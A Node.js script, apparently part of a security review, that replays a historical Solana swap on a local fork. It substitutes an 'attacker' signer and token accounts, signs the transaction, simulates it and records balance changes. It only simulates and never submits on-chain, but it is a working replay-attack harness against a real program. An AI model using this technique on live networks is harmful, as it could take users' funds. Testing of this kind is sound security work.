#!/usr/bin/env node
'use strict';
// One signed, read-only local-fork swap gate. Never submits to mainnet.
const fs = require('fs');
const crypto = require('crypto');
const MOD = '/Users/stacc/the-composer-rescue/composer-runs/2026-10-15/jup6qf-sdk/node_modules';
const {PublicKey, Keypair, TransactionInstruction, TransactionMessage, SystemProgram} = require(`${MOD}/@solana/web3.js`);
const {getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID} = require(`${MOD}/@solana/spl-token`);
const bs58 = require(`${MOD}/bs58`);
const {encodeV1} = require('./klend-v1-composition.js');
const P = x => new PublicKey(x);
const PROGRAM = P('9H6tua7jkLhdm3w8BvgpTn5LZNU7g4ZynDmCiNN3q6Rp');
const WET = P('WETZjtprkDMCcUxPi9PfWnowMRZkiGGHDb9rABuRZ2U');
const USDC = P('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
const SOURCE_SIG = process.env.HUMIDIFI_SOURCE_SIG || '5QdviMsvzqLj8ibnFvdiwcuEHQxnubSGeWZSAF3anA5AfBx23XM9HLRSGrZH7o9uNWwCgksLewmjqAJcdWKsodmj';
const FORK = 'http://127.0.0.1:9305';
const env = Object.fromEntries(fs.readFileSync('/tmp/composer-helius-only.env', 'utf8')
  .split(/\r?\n/).filter(Boolean).map(x => x.split(/=(.*)/s).slice(0, 2)));
const UPSTREAM = env.HEAVY_RPC_URL || env.RPC_URL;
const rawKey = JSON.parse(fs.readFileSync(`${process.env.HOME}/hooked.json`, 'utf8'));
if (!Array.isArray(rawKey) || rawKey.length !== 64 || rawKey.some(x => !Number.isInteger(x) || x < 0 || x > 255))
  throw Error('hooked.json is not a 64-byte keypair array');
const attacker = Keypair.fromSecretKey(Uint8Array.from(rawKey));
rawKey.fill(0);
const attackerUsdc = getAssociatedTokenAddressSync(USDC, attacker.publicKey);
const attackerWet = getAssociatedTokenAddressSync(WET, attacker.publicKey);
let id = 0;
async function rpc(url, method, params) {
  const r = await fetch(url, {method:'POST', headers:{'content-type':'application/json'},
    body:JSON.stringify({jsonrpc:'2.0', id:++id, method, params})});
  const j = await r.json();
  if (j.error) throw Error(`${method}: ${JSON.stringify(j.error)}`);
  return j.result;
}
async function seedAta(mint, ata, amount) {
  const b = Buffer.alloc(165);
  mint.toBuffer().copy(b, 0); attacker.publicKey.toBuffer().copy(b, 32);
  b.writeBigUInt64LE(BigInt(amount), 64); b[108] = 1;
  await rpc(FORK, 'surfnet_setAccount', [String(ata), {data:b.toString('hex'), executable:false,
    lamports:2039280, owner:String(TOKEN_PROGRAM_ID), rentEpoch:0}]);
}
function rawAmount(a) {
  if (!a) return null;
  const b = Buffer.from(a.data[0], 'base64');
  return a.owner === String(TOKEN_PROGRAM_ID) && b.length >= 72 ? b.readBigUInt64LE(64).toString() : null;
}
async function main() {
  const tx = await rpc(UPSTREAM, 'getTransaction', [SOURCE_SIG,
    {encoding:'json', commitment:'confirmed', maxSupportedTransactionVersion:1}]);
  const msg = tx.transaction.message;
  const loaded = tx.meta.loadedAddresses || {writable:[], readonly:[]};
  const keys = [...msg.accountKeys, ...loaded.writable, ...loaded.readonly];
  const src = tx.meta.innerInstructions.flatMap(g => g.instructions)
    .find(ix => keys[ix.programIdIndex] === String(PROGRAM));
  if (!src) throw Error('source swap missing');
  const old = src.accounts.map(i => keys[i]);
  if (old[1] !== 'Cc2oMdeNDmZ7ZD8b7igQg1EHjBEinR1Vi6nx2VHpVm6H' ||
      old[2] !== '7gxM8fzfJ331g1yddEDUDrz4BLwEEPPPcCDV57pDQWyT' ||
      old[3] !== 'F9JdjxCTiyy9xB4BjvGQAzzxetVJQWAjWzAMxzMMD23D' ||
      old[9] !== 'Sysvar1nstructions1111111111111111111111111')
    throw Error('historical account mapping drift');
  const h = msg.header, statics = msg.accountKeys.length;
  const writable = j => j < statics ? j < h.numRequiredSignatures ?
    j < h.numRequiredSignatures - h.numReadonlySignedAccounts :
    j < statics - h.numReadonlyUnsignedAccounts : j < statics + loaded.writable.length;
  const ix = new TransactionInstruction({programId:PROGRAM,
    keys:src.accounts.map((j,k) => ({pubkey:k===0?attacker.publicKey:
      k===4?attackerWet:k===5?attackerUsdc:P(keys[j]),
      isSigner:k===0, isWritable:writable(j)})),
    data:Buffer.from(bs58.decode(src.data))});
  await rpc(FORK, 'surfnet_setAccount', [String(attacker.publicKey), {data:'', executable:false,
    lamports:1000000000, owner:String(SystemProgram.programId), rentEpoch:0}]);
  await seedAta(USDC, attackerUsdc, 1000000000n);
  await seedAta(WET, attackerWet, 0n);
  await rpc(FORK, 'getMultipleAccounts', [ix.keys.map(k => String(k.pubkey)), {encoding:'base64'}]);
  const watch = [attackerUsdc, attackerWet, P(old[2]), P(old[3])];
  const before = (await rpc(FORK, 'getMultipleAccounts', [watch.map(String), {encoding:'base64'}])).value.map(rawAmount);
  const bh = (await rpc(FORK, 'getLatestBlockhash', [{commitment:'processed'}])).value.blockhash;
  const encoded = encodeV1([ix], attacker.publicKey, bh);
  const compiled = new TransactionMessage({payerKey:attacker.publicKey, recentBlockhash:bh,
    instructions:[ix]}).compileToV0Message();
  const expected = compiled.staticAccountKeys.slice(0, encoded.requiredSignatures).map(String);
  if (expected.length !== 1 || expected[0] !== String(attacker.publicKey))
    throw Error(`uncontrolled signers ${expected.join(',')}`);
  const wire = Buffer.from(encoded.wire);
  const key = crypto.createPrivateKey({key:Buffer.concat([
    Buffer.from('302e020100300506032b657004220420','hex'),
    Buffer.from(attacker.secretKey.subarray(0,32))]), format:'der', type:'pkcs8'});
  crypto.sign(null, wire.subarray(0, wire.length-64), key).copy(wire, wire.length-64);
  const r = await rpc(FORK, 'simulateTransaction', [wire.toString('base64'),
    {encoding:'base64', sigVerify:true, replaceRecentBlockhash:false, commitment:'processed',
      innerInstructions:true, accounts:{encoding:'base64', addresses:watch.map(String)}}]);
  const after = (r.value.accounts || []).map(rawAmount);
  const delta = before.map((v,i) => v!=null && after[i]!=null ?
    (BigInt(after[i])-BigInt(v)).toString() : null);
  const out = {at:new Date().toISOString(), target:String(PROGRAM), sourceSignature:SOURCE_SIG,
    sourceSlot:tx.slot, fork:FORK, hookedPublicAddress:String(attacker.publicKey),
    substitutions:{signer:[old[0],String(attacker.publicKey)],outputWet:[old[4],String(attackerWet)],
      inputUsdc:[old[5],String(attackerUsdc)]},
    transaction:{version:1, bytes:encoded.sizeBytes, accounts:encoded.addressCount,
      instructions:1, sigVerify:true, sha256:crypto.createHash('sha256').update(wire).digest('hex')},
    success:r.value.err===null, err:r.value.err, cu:r.value.unitsConsumed,
    watch:watch.map(String), before, after, delta,
    logs:r.value.logs?.filter(x => x.includes('Program log:') || x.includes('failed') || x.includes('Error')).slice(-35)};
  const suffix = process.env.HUMIDIFI_SOURCE_SIG ? '-large' : '';
  fs.writeFileSync(__dirname+`/humidifi-wet-signed-gate${suffix}.json`, JSON.stringify(out,null,2)+'\n');
  console.log(JSON.stringify({success:out.success, err:out.err, cu:out.cu,
    bytes:out.transaction.bytes, accounts:out.transaction.accounts, delta:out.delta,
    logs:out.logs?.slice(-10)},null,2));
}
main().catch(e => {console.error(e.stack||e);process.exitCode=1});
